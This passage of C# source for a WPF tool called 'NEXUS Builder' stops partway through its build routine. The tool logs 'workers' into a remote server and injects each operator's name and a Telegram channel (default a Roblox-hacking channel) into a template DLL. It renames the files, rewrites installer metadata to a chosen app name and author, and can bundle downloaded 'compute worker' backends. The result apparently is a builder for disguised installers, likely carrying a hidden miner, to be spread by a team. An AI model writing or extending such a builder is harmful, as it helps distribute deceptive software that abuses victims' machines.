using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Color = System.Windows.Media.Color;
using WpfButton = System.Windows.Controls.Button;
using WpfCheckBox = System.Windows.Controls.CheckBox;
using WpfComboBox = System.Windows.Controls.ComboBox;
using WpfTextBox = System.Windows.Controls.TextBox;
using WpfOrientation = System.Windows.Controls.Orientation;

namespace NexusBuilder
{
    public partial class MainWindow : Window
    {
        private const string AppVersion = "8.0.1";
        private static readonly HttpClient _http = new HttpClient { Timeout = TimeSpan.FromMinutes(10) };
        private string? _cachedIsccPath;
        private string _activeIconPath = "";
        private bool _isInitialized = false;

        private string _currentUser = "";
        private string _authToken = "";
        private bool _isUserAdmin = false;
        private readonly string _authFilePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "NEXUS_Builder", "auth.json"
        );
        private readonly string _projectConfigFilePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "NEXUS_Builder", "custom_project_config.json"
        );
        private readonly string _computeConfigFilePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "NEXUS_Builder", "compute_module_config.json"
        );
        private static readonly string API_BASE = "https://file-transfer-production-75ad.up.railway.app";

        public ObservableCollection<CustomProjectParam> CustomProjectParams { get; set; } = new ObservableCollection<CustomProjectParam>();
        public ComputeRootConfig ComputeConfig { get; set; } = new ComputeRootConfig();

        public MainWindow()
        {
            InitializeComponent();
            _isInitialized = true;
            
            string defaultOut = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
                "NEXUS_Builds_v8.0.1"
            );
            tbOutputPath.Text = defaultOut;

            ExtractEmbeddedIcons();
            InitializeDefaultIcon();
            _cachedIsccPath = FindIsccPath();

            InitializeComputeModuleUI();
            LoadCustomProjectParams();

            Log("⚡ NEXUS Builder v" + AppVersion + " [Cloud Sync] готов к работе.");
            Log("• Доступна сборка: Standalone Инсталлятор (PRO) и Client Инсталлятор.");
            Log("• Облачная синхронизация шаблонов: Активна (автоматическая загрузка).");

            TryAutoLogin();
        }

        private void ExtractEmbeddedIcons()
        {
            try
            {
                string iconDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "NEXUS_Builder", "icons"
                );
                Directory.CreateDirectory(iconDir);

                var asm = Assembly.GetExecutingAssembly();
                foreach (string resName in asm.GetManifestResourceNames())
                {
                    if (resName.EndsWith(".ico", StringComparison.OrdinalIgnoreCase))
                    {
                        string fileName = resName;
                        int lastDot = resName.LastIndexOf('.', resName.Length - 5);
                        if (lastDot >= 0)
                        {
                            fileName = resName.Substring(lastDot + 1);
                        }

                        string targetPath = Path.Combine(iconDir, fileName);
                        using var s = asm.GetManifestResourceStream(resName);
                        if (s != null)
                        {
                            using var fs = new FileStream(targetPath, FileMode.Create, FileAccess.Write);
                            s.CopyTo(fs);
                        }
                    }
                }
            }
            catch { }
        }

        private async void TryAutoLogin()
        {
            try
            {
                if (File.Exists(_authFilePath))
                {
                    string json = await File.ReadAllTextAsync(_authFilePath);
                    using var doc = JsonDocument.Parse(json);
                    var root = doc.RootElement;
                    if (root.TryGetProperty("user", out var u) && root.TryGetProperty("token", out var t))
                    {
                        string user = u.GetString() ?? "";
                        string token = t.GetString() ?? "";
                        if (!string.IsNullOrWhiteSpace(user) && !string.IsNullOrWhiteSpace(token))
                        {
                            ApplyUserSession(user, token);
                            return;
                        }
                    }
                }
            }
            catch { }

            ShowLoginScreen();
        }

        private void ShowLoginScreen()
        {
            gridMainBuilder.Visibility = Visibility.Collapsed;
            gridAuthLogin.Visibility = Visibility.Visible;
            badgeUserSession.Visibility = Visibility.Collapsed;
            tbAuthLogin.Focus();
        }

        private void ShowAuthError(string msg)
        {
            txtAuthError.Text = msg;
            borderAuthError.Visibility = Visibility.Visible;
        }

        private async void BtnAuthLogin_Click(object sender, RoutedEventArgs e)
        {
            string username = tbAuthLogin.Text.Trim();
            string password = pbAuthPassword.Password;

            if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password))
            {
                ShowAuthError("⚠️ Введите логин и пароль");
                return;
            }

            btnAuthLogin.IsEnabled = false;
            btnAuthLogin.Content = "ПОДКЛЮЧЕНИЕ...";
            borderAuthError.Visibility = Visibility.Collapsed;

            try
            {
                var payload = JsonSerializer.Serialize(new { username, password });
                using var content = new StringContent(payload, Encoding.UTF8, "application/json");
                using var resp = await _http.PostAsync($"{API_BASE}/api/login", content);

                if (!resp.IsSuccessStatusCode)
                {
                    ShowAuthError("⚠️ Неверный логин или пароль!");
                    return;
                }

                string respBody = await resp.Content.ReadAsStringAsync();
                using var doc = JsonDocument.Parse(respBody);
                var root = doc.RootElement;
                string user = root.TryGetProperty("user", out var u) ? u.GetString() ?? username : username;
                string token = root.TryGetProperty("token", out var t) ? t.GetString() ?? "" : "";

                if (chkRememberSession.IsChecked == true)
                {
                    try
                    {
                        Directory.CreateDirectory(Path.GetDirectoryName(_authFilePath)!);
                        string saveJson = JsonSerializer.Serialize(new { user, token, savedAt = DateTime.UtcNow });
                        await File.WriteAllTextAsync(_authFilePath, saveJson);
                    }
                    catch { }
                }

                ApplyUserSession(user, token);
            }
            catch (Exception ex)
            {
                ShowAuthError("⚠️ Ошибка связи с сервером: " + ex.Message);
            }
            finally
            {
                btnAuthLogin.IsEnabled = true;
                btnAuthLogin.Content = "Войти в систему";
            }
        }

        private void TbAuthField_KeyDown(object sender, System.Windows.Input.KeyEventArgs e)
        {
            if (e.Key == System.Windows.Input.Key.Enter)
            {
                BtnAuthLogin_Click(sender, e);
            }
        }

        private void ApplyUserSession(string user, string token)
        {
            _currentUser = user;
            _authToken = token;
            _isUserAdmin = user.Equals("shonll", StringComparison.OrdinalIgnoreCase);

            lblLoggedInUser.Text = user;
            lblLoggedInRole.Text = _isUserAdmin ? "ADMIN" : "WORKER";
            badgeUserSession.Visibility = Visibility.Visible;

            if (_isUserAdmin)
            {
                cbOperators.IsEnabled = true;
                borderNonAdminNotice.Visibility = Visibility.Collapsed;
            }
            else
            {
                // Не-админ: строго привязываем к его авторизованному имени
                borderNonAdminNotice.Visibility = Visibility.Visible;
                txtNonAdminNotice.Text = $"🔒 Профиль заблокирован: {user}";
                cbOperators.IsEnabled = false;

                bool found = false;
                for (int i = 0; i < cbOperators.Items.Count; i++)
                {
                    if (cbOperators.Items[i] is ComboBoxItem cbi && cbi.Tag?.ToString()?.Equals(user, StringComparison.OrdinalIgnoreCase) == true)
                    {
                        cbOperators.SelectedIndex = i;
                        found = true;
                        break;
                    }
                }

                if (!found)
                {
                    var newItem = new ComboBoxItem
                    {
                        Content = $"👤 {user} (Ваш профиль)",
                        Tag = user,
                        IsSelected = true
                    };
                    cbOperators.Items.Insert(0, newItem);
                    cbOperators.SelectedIndex = 0;
                }

                if (tbCustomOperator != null) tbCustomOperator.Visibility = Visibility.Collapsed;
            }

            gridAuthLogin.Visibility = Visibility.Collapsed;
            gridMainBuilder.Visibility = Visibility.Visible;

            Log($"✅ Авторизован: {user} [{(_isUserAdmin ? "Главный Администратор" : "Оператор / Воркер")}]");
            Log($"• Профиль: {(_isUserAdmin ? "Любой (свободный выбор)" : $"Закреплён за {user}")}");
        }

        private void BtnLogout_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if (File.Exists(_authFilePath)) File.Delete(_authFilePath);
            }
            catch { }

            _currentUser = "";
            _authToken = "";
            _isUserAdmin = false;

            pbAuthPassword.Password = "";
            borderAuthError.Visibility = Visibility.Collapsed;
            ShowLoginScreen();

            Log("🚪 Выполнен выход из аккаунта. Билдер заблокирован.");
        }

        private string? FindIsccPath()
        {
            string[] possiblePaths = new[]
            {
                @"C:\Program Files (x86)\Inno Setup 6\ISCC.exe",
                @"C:\Program Files\Inno Setup 6\ISCC.exe",
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\Inno Setup 6\ISCC.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"NEXUS_Builder\inno\ISCC.exe"),
                @"C:\Program Files (x86)\Inno Setup 5\ISCC.exe",
                @"C:\Program Files\Inno Setup 5\ISCC.exe"
            };

            foreach (var p in possiblePaths)
            {
                if (File.Exists(p)) return p;
            }

            var envPath = Environment.GetEnvironmentVariable("PATH") ?? "";
            foreach (var dir in envPath.Split(Path.PathSeparator))
            {
                try
                {
                    string cand = Path.Combine(dir.Trim(), "ISCC.exe");
                    if (File.Exists(cand)) return cand;
                }
                catch { }
            }

            return null;
        }

        private async Task<string?> EnsureInnoSetup()
        {
            string? iscc = FindIsccPath();
            if (!string.IsNullOrEmpty(iscc) && File.Exists(iscc)) return iscc;

            string portableDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "NEXUS_Builder", "inno"
            );
            string portableIscc = Path.Combine(portableDir, "ISCC.exe");
            if (File.Exists(portableIscc)) return portableIscc;

            Log("⚙️ Inno Setup не обнаружен в системе. Автоматическая загрузка портативного компилятора...");
            Directory.CreateDirectory(portableDir);

            string zipPath = Path.Combine(portableDir, "inno_portable.zip");
            string downloadUrl = $"{API_BASE}/downloads/templates/inno_portable.zip";

            try
            {
                using var resp = await _http.GetAsync(downloadUrl, HttpCompletionOption.ResponseHeadersRead);
                if (!resp.IsSuccessStatusCode)
                {
                    Log($"❌ Не удалось загрузить Inno Setup с сервера (HTTP {resp.StatusCode})");
                    return null;
                }

                using (var fs = new FileStream(zipPath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    await resp.Content.CopyToAsync(fs);
                }

                Log("📦 Распаковка портативного компилятора Inno Setup...");
                ZipFile.ExtractToDirectory(zipPath, portableDir, true);
                try { File.Delete(zipPath); } catch { }

                if (File.Exists(portableIscc))
                {
                    Log("✅ Портативный Inno Setup успешно настроен!");
                    return portableIscc;
                }
            }
            catch (Exception ex)
            {
                Log("❌ Ошибка загрузки Inno Setup: " + ex.Message);
            }

            return null;
        }

        private const string REQUIRED_TEMPLATE_VERSION = "8.2.0";

        private async Task<string> EnsureAppTemplate()
        {
            string templatesDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "NEXUS_Builder", "templates", "app_template"
            );

            string verFile = Path.Combine(templatesDir, "template_version.txt");
            bool isUpToDate = File.Exists(verFile) && File.ReadAllText(verFile).Trim() == REQUIRED_TEMPLATE_VERSION;

            // Проверяем, есть ли уже распакованный актуальный шаблон со всеми DLL
            if (isUpToDate && Directory.Exists(templatesDir) && 
                File.Exists(Path.Combine(templatesDir, "RAH PRO.dll")) && 
                File.Exists(Path.Combine(templatesDir, "RAH Non Pro.dll")))
            {
                return templatesDir;
            }

            // Проверяем кэш актуальных версий на ПК разработчика
            string oldClientCache = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NEXUS_Builder", "templates", "client_multifile");
            string oldStandaloneCache = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NEXUS_Builder", "templates", "standalone_multifile");

            if (Directory.Exists(oldClientCache) && File.Exists(Path.Combine(oldClientCache, "RAH Non Pro.dll")) &&
                Directory.Exists(oldStandaloneCache) && File.Exists(Path.Combine(oldStandaloneCache, "RAH PRO.dll")))
            {
                if (Directory.Exists(templatesDir))
                {
                    try { Directory.Delete(templatesDir, true); } catch { }
                }
                Directory.CreateDirectory(templatesDir);
                CopyDirectory(oldClientCache, templatesDir);
                foreach (var f in Directory.GetFiles(oldStandaloneCache, "RAH PRO.*"))
                {
                    File.Copy(f, Path.Combine(templatesDir, Path.GetFileName(f)), true);
                }
                File.WriteAllText(verFile, REQUIRED_TEMPLATE_VERSION);
                if (File.Exists(Path.Combine(templatesDir, "RAH PRO.dll")))
                {
                    return templatesDir;
                }
            }

            // Загрузка с сервера для пользователей
            Log("📥 Обновление шаблона приложения. Загрузка с сервера...");
            Directory.CreateDirectory(Path.GetDirectoryName(templatesDir)!);

            string zipPath = Path.Combine(Path.GetDirectoryName(templatesDir)!, "app_template.zip");
            string downloadUrl = $"{API_BASE}/downloads/templates/app_template.zip?v={REQUIRED_TEMPLATE_VERSION}";

            try
            {
                using var resp = await _http.GetAsync(downloadUrl, HttpCompletionOption.ResponseHeadersRead);
                if (!resp.IsSuccessStatusCode)
                {
                    Log($"❌ Ошибка скачивания шаблона: сервер вернул код {resp.StatusCode}");
                    return "";
                }

                long totalBytes = resp.Content.Headers.ContentLength ?? 72000000;
                using var contentStream = await resp.Content.ReadAsStreamAsync();
                using (var fs = new FileStream(zipPath, FileMode.Create, FileAccess.Write, FileShare.None, 81920, true))
                {
                    byte[] buffer = new byte[81920];
                    long totalRead = 0;
                    int bytesRead;
                    DateTime lastLog = DateTime.Now;

                    while ((bytesRead = await contentStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                    {
                        await fs.WriteAsync(buffer, 0, bytesRead);
                        totalRead += bytesRead;

                        if ((DateTime.Now - lastLog).TotalMilliseconds > 400)
                        {
                            int percent = (int)((totalRead * 100) / totalBytes);
                            if (percent > 100) percent = 100;
                            Dispatcher.Invoke(() =>
                            {
                                pbProgress.Value = percent;
                                lblStatus.Text = $"• Загрузка шаблона: {percent}% ({totalRead / (1024 * 1024)} МБ / {totalBytes / (1024 * 1024)} МБ)...";
                            });
                            lastLog = DateTime.Now;
                        }
                    }
                }

                Log("📦 Распаковка шаблона приложения в локальный кэш...");
                Dispatcher.Invoke(() => { pbProgress.IsIndeterminate = true; lblStatus.Text = "• Распаковка шаблона..."; });

                if (Directory.Exists(templatesDir)) Directory.Delete(templatesDir, true);
                Directory.CreateDirectory(templatesDir);
                ZipFile.ExtractToDirectory(zipPath, templatesDir, true);
                File.WriteAllText(verFile, REQUIRED_TEMPLATE_VERSION);

                try { File.Delete(zipPath); } catch { }

                Log("✅ Шаблон приложения успешно загружен и готов!");
                return templatesDir;
            }
            catch (Exception ex)
            {
                Log("❌ Ошибка загрузки шаблона: " + ex.Message);
                return "";
            }
        }

        private void InitializeDefaultIcon()
        {
            SelectPresetIcon("thunder");
        }

        private string GetPresetIconPath(string tag)
        {
            string fileName = tag switch
            {
                "fire" => "fire.ico",
                "singer" => "singer.ico",
                "svyaz" => "svyaz.ico",
                "cyber" => "cyber.ico",
                _ => "thunder.ico"
            };

            string appDataIcons = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "NEXUS_Builder", "icons"
            );
            string iconPath = Path.Combine(appDataIcons, fileName);
            if (File.Exists(iconPath)) return iconPath;

            string fallback = Path.Combine(appDataIcons, "app.ico");
            if (File.Exists(fallback)) return fallback;

            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string localFallback = Path.Combine(baseDir, fileName);
            if (File.Exists(localFallback)) return localFallback;

            return iconPath;
        }

        private void SelectPresetIcon(string tag)
        {
            string path = GetPresetIconPath(tag);
            SetIcon(path, $"{tag}.ico (Встроенная)");
        }

        private void SetIcon(string path, string displayName)
        {
            _activeIconPath = path;
            if (lblIconName != null)
            {
                lblIconName.Text = displayName;
            }

            if (imgIconPreview != null)
            {
                try
                {
                    if (File.Exists(path))
                    {
                        var bmp = new BitmapImage();
                        bmp.BeginInit();
                        bmp.UriSource = new Uri(path, UriKind.Absolute);
                        bmp.CacheOption = BitmapCacheOption.OnLoad;
                        bmp.EndInit();
                        imgIconPreview.Source = bmp;
                    }
                    else
                    {
                        imgIconPreview.Source = null;
                    }
                }
                catch
                {
                    imgIconPreview.Source = null;
                }
            }
        }

        private void CbIconPresets_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (!_isInitialized || cbIconPresets == null) return;

            if (cbIconPresets.SelectedItem is ComboBoxItem item)
            {
                string tag = item.Tag?.ToString() ?? "thunder";
                if (tag == "__custom_ico__")
                {
                    BtnBrowseIcon_Click(sender, e);
                }
                else
                {
                    SelectPresetIcon(tag);
                }
            }
        }

        private void BtnBrowseIcon_Click(object sender, RoutedEventArgs e)
        {
            using var ofd = new System.Windows.Forms.OpenFileDialog();
            ofd.Title = "Выберите файл иконки приложения (.ico)";
            ofd.Filter = "Иконки (*.ico)|*.ico|Все файлы (*.*)|*.*";
            ofd.FilterIndex = 1;

            if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                SetIcon(ofd.FileName, Path.GetFileName(ofd.FileName));
                Log($"🎨 Выбрана иконка: {ofd.FileName}");
            }
        }

        private void TitleBar_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left)
            {
                DragMove();
            }
        }

        private void BtnMinimize_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        private void BtnClose_Click(object sender, RoutedEventArgs e)
        {
            Close();
        }

        private void Log(string msg)
        {
            Dispatcher.Invoke(() =>
            {
                string time = DateTime.Now.ToString("HH:mm:ss");
                txtConsole.AppendText($"[{time}] {msg}\n");
                scrollConsole.ScrollToEnd();
            });
        }

        private void CbOperators_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (!_isInitialized || cbOperators == null) return;

            if (cbOperators.SelectedItem is ComboBoxItem item)
            {
                string tag = item.Tag?.ToString() ?? "";
                bool isCustom = tag == "__custom__";
                if (tbCustomOperator != null)
                {
                    tbCustomOperator.Visibility = isCustom ? Visibility.Visible : Visibility.Collapsed;
                    if (isCustom) tbCustomOperator.Focus();
                }

                if (cbIconPresets != null)
                {
                    string targetIconTag = tag.ToLowerInvariant() switch
                    {
                        "dildman" => "fire",
                        "singer1isss" => "singer",
                        "saha_kakaha122" => "svyaz",
                        "huilaebanaya" => "cyber",
                        _ => "thunder"
                    };

                    for (int i = 0; i < cbIconPresets.Items.Count; i++)
                    {
                        if (cbIconPresets.Items[i] is ComboBoxItem cbi && cbi.Tag?.ToString() == targetIconTag)
                        {
                            cbIconPresets.SelectedIndex = i;
                            break;
                        }
                    }
                }
            }
        }

        private string GetSelectedOperator()
        {
            if (!_isUserAdmin && !string.IsNullOrWhiteSpace(_currentUser))
            {
                return _currentUser;
            }

            if (cbOperators.SelectedItem is ComboBoxItem item)
            {
                string tag = item.Tag?.ToString() ?? "";
                if (tag == "__custom__")
                {
                    string custom = tbCustomOperator.Text.Trim();
                    return string.IsNullOrWhiteSpace(custom) ? (_currentUser.Length > 0 ? _currentUser : "HuilaEbanaya") : custom;
                }
                return tag;
            }
            return string.IsNullOrWhiteSpace(_currentUser) ? "HuilaEbanaya" : _currentUser;
        }

        private void BtnBrowse_Click(object sender, RoutedEventArgs e)
        {
            using var dialog = new System.Windows.Forms.FolderBrowserDialog();
            dialog.Description = "Выберите папку для сохранения собранных приложений";
            dialog.UseDescriptionForTitle = true;
            dialog.SelectedPath = tbOutputPath.Text;
            if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                tbOutputPath.Text = dialog.SelectedPath;
                Log($"📁 Папка назначения: {dialog.SelectedPath}");
            }
        }

        private void BtnOpenFolder_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                string folder = tbOutputPath.Text;
                if (Directory.Exists(folder))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = folder,
                        UseShellExecute = true
                    });
                }
            }
            catch (Exception ex)
            {
                Log("Ошибка открытия папки: " + ex.Message);
            }
        }

        private async void BtnBuildStandaloneInstaller_Click(object sender, RoutedEventArgs e)
        {
            await RunBuild(isStandalone: true);
        }

        private async void BtnBuildClientInstaller_Click(object sender, RoutedEventArgs e)
        {
            await RunBuild(isStandalone: false);
        }

        private async Task RunBuild(bool isStandalone)
        {
            if (string.IsNullOrWhiteSpace(_currentUser))
            {
                Log("❌ Ошибка: Сборка заблокирована! Требуется авторизация в аккаунте.");
                ShowLoginScreen();
                return;
            }

            string opName = GetSelectedOperator();
            string appName = tbAppName.Text.Trim();
            if (string.IsNullOrWhiteSpace(appName)) appName = "RAH";
            string appAuthor = tbAuthor?.Text.Trim() ?? "";
            if (string.IsNullOrWhiteSpace(appAuthor)) appAuthor = "RAH Team";
            string tgChannel = tbTelegramChannel?.Text.Trim() ?? "";
            if (string.IsNullOrWhiteSpace(tgChannel)) tgChannel = "https://t.me/robloxvzlomez";
            else if (!tgChannel.StartsWith("http://", StringComparison.OrdinalIgnoreCase) && !tgChannel.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            {
                tgChannel = "https://t.me/" + tgChannel.TrimStart('@');
            }

            string outDir = tbOutputPath.Text.Trim();
            if (string.IsNullOrWhiteSpace(outDir))
            {
                outDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "NEXUS_Builds_v8.0.1");
            }

            string cleanExeBaseName = string.Concat(appName.Split(Path.GetInvalidFileNameChars())).Trim();
            if (string.IsNullOrWhiteSpace(cleanExeBaseName)) cleanExeBaseName = "RAH";

            string buildTypeTitle = isStandalone ? "Standalone Инсталлятор (PRO)" : "Client Инсталлятор";
            string targetOutputName = $"{cleanExeBaseName}_Setup_{opName}.exe";
            string outputFullPath = Path.Combine(outDir, targetOutputName);

            // Валидация пользовательских параметров проекта
            var (isParamsValid, paramsErr) = ValidateAllCustomParams();
            if (!isParamsValid)
            {
                Log($"❌ ОШИБКА ВАЛИДАЦИИ ПАРАМЕТРОВ ПРОЕКТА: {paramsErr}");
                System.Windows.MessageBox.Show($"Ошибка в пользовательских параметрах проекта:\n\n{paramsErr}", "Валидация конфигурации", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            // Валидация Compute Module
            var (isComputeValid, computeErr) = ValidateComputeModuleConfig();
            if (!isComputeValid)
            {
                Log($"❌ {computeErr}");
                System.Windows.MessageBox.Show(computeErr, "Валидация Compute Module", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            var customConfigDict = BuildCustomConfigDictionary();
            SaveCustomProjectParams(); // Гарантированное сохранение при билде

            // Автоматическая подготовка и проверка внешних Compute компонентов
            if (ComputeConfig.Enabled && ComputeConfig.Modules.Any(m => m.Enabled))
            {
                // Collect all unique legacy modes required by active modules
                var requiredModes = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                for (int mi = 0; mi < ComputeConfig.Modules.Count; mi++)
                {
                    var mod = ComputeConfig.Modules[mi];
                    if (!mod.Enabled) continue;

                    string legacyMode = MapAlgorithmToLegacyMode(mod.Primary.Algorithm);
                    requiredModes.Add(legacyMode);
                    if (mod.IsDualMode && !string.IsNullOrEmpty(mod.Secondary.Algorithm))
                    {
                        string secondaryMode = MapAlgorithmToLegacyMode(mod.Secondary.Algorithm);
                        requiredModes.Add(secondaryMode);
                    }

                    var algoDef = AlgorithmRegistry.GetById(mod.Primary.Algorithm);
                    Log($"[Compute Module #{mi + 1}] Mode: {(mod.IsDualMode ? "Dual" : "Single")}, Algorithm: {algoDef?.DisplayName ?? mod.Primary.Algorithm}, Backend: {algoDef?.Backend ?? "unknown"}, Status: {(mod.Enabled ? "Active" : "Disabled")}");
                }

                // Prepare each unique worker backend
                foreach (string modeVal in requiredModes)
                {
                    var (workerReady, workerPath, workerMsg) = await ComputeWorkerManager.PrepareWorkerAsync(
                        modeVal,
                        msg => Log(msg),
                        pct => Dispatcher.Invoke(() => { pbProgress.Value = pct; lblStatus.Text = $"• Загрузка worker: {pct}%..."; })
                    );

                    if (!workerReady)
                    {
                        Log($"⚠️ Внимание: {workerMsg}");
                        var answer = System.Windows.MessageBox.Show(
                            $"{workerMsg}\n\nПродолжить сборку без этого вычислительного компонента?",
                            "Подготовка Compute Worker",
                            MessageBoxButton.YesNo,
                            MessageBoxImage.Warning
                        );
                        if (answer != MessageBoxResult.Yes)
                        {
                            return;
                        }
                    }
                }
            }

            btnBuildStandaloneInstaller.IsEnabled = false;
            btnBuildClientInstaller.IsEnabled = false;
            btnBrowse.IsEnabled = false;
            btnOpenFolder.Visibility = Visibility.Collapsed;
            pbProgress.IsIndeterminate = true;
            lblStatus.Text = $"• Сборка {buildTypeTitle}...";

            Log("═════════════════════════════════════════════════════════════════");
            Log($"🚀 СТАРТ СБОРКИ: {buildTypeTitle}");
            Log($"👤 Целевой профиль оператора: {opName}");
            Log($"🏷️ Имя приложения: {appName}");
            Log($"🏢 Автор / Издатель: {appAuthor}");
            Log($"📢 Telegram канал: {tgChannel}");
            Log($"⚙️ Пользовательских параметров: {customConfigDict.Count}");
            Log($"🎨 Иконка: {Path.GetFileName(_activeIconPath)}");
            Log($"💾 Путь назначения: {outputFullPath}");


            bool success = false;

            await Task.Run(async () =>
            {
                try
                {
                    // 1. Получение шаблона приложения (из локального кэша или автоматическая загрузка)
                    string templateDir = await EnsureAppTemplate();
                    if (string.IsNullOrEmpty(templateDir) || !Directory.Exists(templateDir))
                    {
                        Log("❌ ОШИБКА: Не удалось получить шаблон приложения!");
                        return;
                    }

                    string stagingDir = Path.Combine(Path.GetTempPath(), $"NEXUS_Stage_{Guid.NewGuid():N}");
                    if (Directory.Exists(stagingDir))
                    {
                        try { Directory.Delete(stagingDir, true); } catch { }
                    }
                    Directory.CreateDirectory(stagingDir);

                    Log("📂 Подготовка файлов приложения...");
                    CopyDirectory(templateDir, stagingDir);

                    // Проверка и сохранение структуры внешних компонентов Compute
                    string computeTemplateDir = Path.Combine(templateDir, "Compute");
                    string computeStagingDir = Path.Combine(stagingDir, "Compute");
                    if (Directory.Exists(computeTemplateDir))
                    {
                        if (!Directory.Exists(computeStagingDir))
                        {
                            Directory.CreateDirectory(computeStagingDir);
                            CopyDirectory(computeTemplateDir, computeStagingDir);
                        }
                        var computeFiles = Directory.GetFiles(computeStagingDir);
                        Log($"📦 Внешние вычислительные компоненты (Compute): обнаружено {computeFiles.Length} файлов в шаблоне.");
                    }

                    // Очистка лишних файлов режима
                    if (isStandalone)
                    {
                        foreach (var f in Directory.GetFiles(stagingDir, "RAH Non Pro.*"))
                        {
                            try { File.Delete(f); } catch { }
                        }
                    }
                    else
                    {
                        foreach (var f in Directory.GetFiles(stagingDir, "RAH PRO.*"))
                        {
                            try { File.Delete(f); } catch { }
                        }
                    }

                    // 2. Внедрение параметров оператора в целевой управляемый DLL
                    string targetDllName = isStandalone ? "RAH PRO.dll" : "RAH Non Pro.dll";
                    string targetDllPath = Path.Combine(stagingDir, targetDllName);

                    if (!File.Exists(targetDllPath))
                    {
                        var dlls = Directory.GetFiles(stagingDir, "*.dll");
                        foreach (var d in dlls)
                        {
                            if (Path.GetFileName(d).Contains("RAH") || Path.GetFileName(d).Contains("FileTransfer"))
                            {
                                targetDllPath = d;
                                break;
                            }
                        }
                    }

                    if (!File.Exists(targetDllPath))
                    {
                        Log("❌ ОШИБКА: Библиотека приложения не найдена!");
                        return;
                    }

                    Log($"💉 Внедрение параметров оператора в {Path.GetFileName(targetDllPath)}...");
                    bool patchOk = InjectConfigIntoFile(targetDllPath, opName, appName, appAuthor, tgChannel, isStandalone, customConfigDict);
                    if (!patchOk)
                    {
                        Log("❌ ОШИБКА внедрения параметров оператора!");
                        return;
                    }

                    // 3. Переименование файлов под выбранное имя приложения и настройка AppHost
                    string finalExeName = $"{cleanExeBaseName}.exe";
                    string finalDllName = $"{cleanExeBaseName}.dll";
                    string finalExePath = Path.Combine(stagingDir, finalExeName);
                    string finalDllPath = Path.Combine(stagingDir, finalDllName);

                    string origDllName = isStandalone ? "RAH PRO.dll" : "RAH Non Pro.dll";
                    string origExeName = isStandalone ? "RAH PRO.exe" : "RAH Non Pro.exe";
                    string origExePath = Path.Combine(stagingDir, origExeName);

                    // Переименовываем целевую DLL
                    if (File.Exists(targetDllPath) && !string.Equals(targetDllPath, finalDllPath, StringComparison.OrdinalIgnoreCase))
                    {
                        File.Move(targetDllPath, finalDllPath, true);
                        Log($"🔄 Библиотека переименована: {Path.GetFileName(targetDllPath)} -> {finalDllName}");
                    }

                    // Переименовываем конфигурационные файлы .NET
                    string origConfigName = isStandalone ? "RAH PRO.runtimeconfig.json" : "RAH Non Pro.runtimeconfig.json";
                    string finalConfigName = $"{cleanExeBaseName}.runtimeconfig.json";
                    string origConfigPath = Path.Combine(stagingDir, origConfigName);
                    string finalConfigPath = Path.Combine(stagingDir, finalConfigName);
                    if (File.Exists(origConfigPath) && !string.Equals(origConfigPath, finalConfigPath, StringComparison.OrdinalIgnoreCase))
                    {
                        File.Move(origConfigPath, finalConfigPath, true);
                    }

                    string origDepsName = isStandalone ? "RAH PRO.deps.json" : "RAH Non Pro.deps.json";
                    string finalDepsName = $"{cleanExeBaseName}.deps.json";
                    string origDepsPath = Path.Combine(stagingDir, origDepsName);
                    string finalDepsPath = Path.Combine(stagingDir, finalDepsName);
                    if (File.Exists(origDepsPath) && !string.Equals(origDepsPath, finalDepsPath, StringComparison.OrdinalIgnoreCase))
                    {
                        File.Move(origDepsPath, finalDepsPath, true);
                    }

                    // Переименовываем исполняемый файл
                    if (File.Exists(origExePath) && !string.Equals(origExePath, finalExePath, StringComparison.OrdinalIgnoreCase))
                    {
                        File.Move(origExePath, finalExePath, true);
                        Log($"🔄 Исполняемый файл переименован: {origExeName} -> {finalExeName}");
                    }

                    // Настраиваем AppHost на запуск новой DLL
                    Log($"🔧 Привязка .NET AppHost к {finalDllName}...");
                    PeMetadataPatcher.UpdateAppHostDllName(finalExePath, origDllName, finalDllName);

                    // Внедряем VersionInfo в ресурсы PE файла (чтобы Windows UAC и Свойства файла отображали имя приложения и автора)
                    Log($"📝 Внедрение свойств в EXE: Имя='{appName}', Автор='{appAuthor}'...");
